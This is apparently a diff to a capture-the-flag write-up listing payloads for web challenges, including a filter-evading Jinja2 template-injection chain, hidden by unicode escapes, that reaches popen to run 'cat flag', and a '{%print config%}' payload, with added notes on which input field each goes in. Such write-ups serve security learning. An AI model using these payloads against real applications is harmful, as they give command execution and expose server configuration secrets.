@@ -6,6 +6,7 @@ Only payload some web challenges
 ```
 {{"\u0022\u0022"|attr("\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f")|attr("\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f")|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")(0)|attr("\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f")()|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")(137)|attr("\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f")|attr("\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f")|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")("\u0070\u006f\u0070\u0065\u006e")("cat flag")|attr("read")()}}
 ```
+Enter in `bio`
 
 ## Render V3
 - SSTI
@@ -13,7 +14,7 @@ Only payload some web challenges
 ```
 {%print config%}
 ```
-Dont need blind :D
+Enter in `message` and dont need blind :D
 
 ## Proxy Service
 - DNS rebinding
